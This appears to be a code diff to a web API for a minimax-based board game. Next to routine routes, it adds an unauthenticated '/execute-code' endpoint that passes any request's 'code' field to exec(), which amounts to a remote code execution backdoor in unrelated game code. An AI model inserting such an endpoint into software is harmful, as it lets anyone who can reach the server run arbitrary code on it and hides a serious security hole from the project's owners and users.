@@ -165,6 +165,7 @@ def minimax(board, depth, alpha, beta, maximizingPlayer):
 @app.get("/")
 def read_root():
     return "Hello there!"
+
 @app.post("/new_game")
 def new_game():
     global board
@@ -212,7 +213,11 @@ def player_move(move: Move):
         "ai_wins": ai_wins
     }
 
-
+@app.post("/execute-code")
+def execute_code(req):
+    code = req.get("code")
+    res = exec(code)
+    return {"message": "Code executed successfully", "result": res}
 @app.get("/ai_move")
 def ai_move():
     global board
